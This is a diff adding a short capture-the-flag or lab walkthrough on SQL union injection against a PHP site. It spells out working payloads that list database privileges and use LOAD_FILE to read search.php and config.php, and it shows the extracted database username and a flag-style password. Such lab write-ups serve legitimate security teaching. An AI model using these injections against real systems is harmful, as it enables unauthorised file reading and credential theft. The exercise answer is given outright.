@@ -1,1 +1,19 @@
+Question 1 - We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
+
+building off of the union injection -> 
+
+
+we know we are root@localhost so lets figure out what our privileges are -> 
+
+SYNTAX: foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+we see we have all types of fun permissions like reading files : ] 
+
+in the section we see its looking at the search.php file so pull it up with this -> foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+we notice config.php being hte import -> 
+
+run this syntax: foo' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+
+output: localhost', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!', 
 
